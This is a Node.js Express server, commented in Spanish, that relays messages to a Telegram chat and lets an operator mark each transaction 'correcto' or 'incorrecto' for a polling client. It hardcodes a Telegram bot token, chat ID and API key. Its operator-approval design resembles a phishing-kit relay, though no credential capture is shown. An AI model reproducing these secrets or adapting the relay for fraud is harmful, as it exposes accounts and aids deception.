const express = require('express');
const bodyParser = require('body-parser');
const axios = require('axios');
const cors = require('cors');

const app = express();
app.use(bodyParser.json());

// Configuración del bot
const TELEGRAM_BOT_TOKEN = '7964659026:AAF-4LsmmIPO-PlhKSrv2mgK6gtvFHrG2Mc';
const TELEGRAM_CHAT_ID = '7877749452';
const API_KEY = 'a8B3dE4F9gH2JkL5mN';
const CLIENT_ID = 'user1';

// Almacenamiento temporal de sesiones (transactionId -> estado)
const sessions = {}; 
// estado puede ser: "pending", "correcto", "incorrecto"

// --- Middleware CORS ---
app.use(cors({
    origin: '*',
    methods: ['GET', 'POST', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'x-api-key-authorization', 'x-client-id']
}));

// Preflight requests
app.options('*', (req, res) => {
    res.sendStatus(200);
});

// --- Middleware de autorización ---
app.use((req, res, next) => {
    const apiKey = req.headers['x-api-key-authorization'];
    const clientId = req.headers['x-client-id'];

    if (apiKey !== API_KEY || clientId !== CLIENT_ID) {
        return res.status(401).send('No autorizado');
    }
    next();
});

// --- Endpoint para enviar mensajes a Telegram ---
app.post('/send-message', async (req, res) => {
    const { mensaje, teclado, transactionId } = req.body;

    if (!transactionId) {
        return res.status(400).send('Falta transactionId');
    }

    sessions[transactionId] = "pending"; // inicializa en pendiente

    try {
        const reply_markup = teclado ? { inline_keyboard: teclado } : undefined;

        const response = await axios.post(
            `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
            {
                chat_id: TELEGRAM_CHAT_ID,
                text: mensaje,
                reply_markup
            }
        );

        console.log("Mensaje enviado a Telegram:", response.data);
        res.json({ status: "sent", transactionId });
    } catch (error) {
        console.error("Error al enviar mensaje a Telegram:", error.response?.data || error.message);
        res.status(500).send(error.response?.data || 'Error al enviar mensaje');
    }
});

// --- Endpoint para consultar estado de un transactionId ---
app.get('/status/:id', (req, res) => {
    const status = sessions[req.params.id] || "not_found";
    res.json({ status });
});

// --- Webhook para recibir los callback_query de Telegram ---
app.post(`/webhook/${TELEGRAM_BOT_TOKEN}`, async (req, res) => {
    const update = req.body;

    if (update.callback_query) {
        const data = update.callback_query.data; // ej: "correcto:abc123"
        const [status, id] = data.split(":");

        if (sessions[id]) {
            sessions[id] = status; // guarda "correcto" o "incorrecto"
            console.log(`Transaction ${id} marcado como ${status}`);
        }

        // Responder a Telegram para quitar el "relojito" en el botón
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
            callback_query_id: update.callback_query.id,
            text: `Marcado como ${status}`
        });
    }

    res.sendStatus(200);
});

// --- Iniciar servidor ---
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Servidor corriendo en puerto ${PORT}`));
